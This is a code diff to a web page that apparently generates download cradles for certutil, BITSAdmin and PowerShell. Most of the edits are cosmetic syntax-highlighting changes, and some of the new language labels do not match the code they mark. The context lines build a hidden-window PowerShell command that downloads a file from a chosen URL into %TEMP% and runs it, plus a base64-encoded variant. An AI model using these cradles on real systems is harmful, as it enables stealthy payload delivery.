@@ -153,24 +153,24 @@ DownloadCradles
 
             <h5 class="card-title">Certutil</h5>
             <p class="section-subtitle">Writes the file to disk. Custom headers are not supported by certutil.</p>
-            <pre><code class="language-bat" id="certutil"></code><span class="copy-btn" onclick="copyCode('certutil')">
+            <pre><code class="language-bash" id="certutil"></code><span class="copy-btn" onclick="copyCode('certutil')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
 
             <h5 class="card-title">BITSAdmin</h5>
             <p class="section-subtitle">Background download. Custom headers are not supported by bitsadmin.</p>
-            <pre><code class="language-bat" id="bitsadmin"></code><span class="copy-btn" onclick="copyCode('bitsadmin')">
+            <pre><code class="language-bash" id="bitsadmin"></code><span class="copy-btn" onclick="copyCode('bitsadmin')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
 
             <h5 class="card-title">PowerShell Invoke-WebRequest</h5>
-            <pre><code class="language-powershell" id="iwr"></code><span class="copy-btn" onclick="copyCode('iwr')">
+            <pre><code class="language-c#" id="iwr"></code><span class="copy-btn" onclick="copyCode('iwr')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
 
             <h5 class="card-title">Base64-encoded PowerShell</h5>
             <p class="section-subtitle">UTF-16LE -EncodedCommand form of the DownloadString cradle.</p>
-            <pre><code class="language-powershell" id="ps1_b64"></code><span class="copy-btn" onclick="copyCode('ps1_b64')">
+            <pre><code class="language-c#" id="ps1_b64"></code><span class="copy-btn" onclick="copyCode('ps1_b64')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
         </div>
@@ -510,6 +510,14 @@ function GenCode(){
     iwr += ` Invoke-WebRequest -Uri '${url}' -Headers $h -OutFile "$env:TEMP\\${safeFile}"; & "$env:TEMP\\${safeFile}";`;
     document.getElementById('iwr').innerText = `powershell.exe -nop -w hidden -c "${iwr}"`;
     document.getElementById('ps1_b64').innerText = `powershell.exe -nop -w hidden -enc ${encodePowershell(ps1_string)}`;
+    highlightCradles();
+}
+
+function highlightCradles() {
+    if (!window.hljs) return;
+    document.querySelectorAll('pre code').forEach(function (block) {
+        hljs.highlightElement(block);
+    });
 }
 
 function encodePowershell(script) {
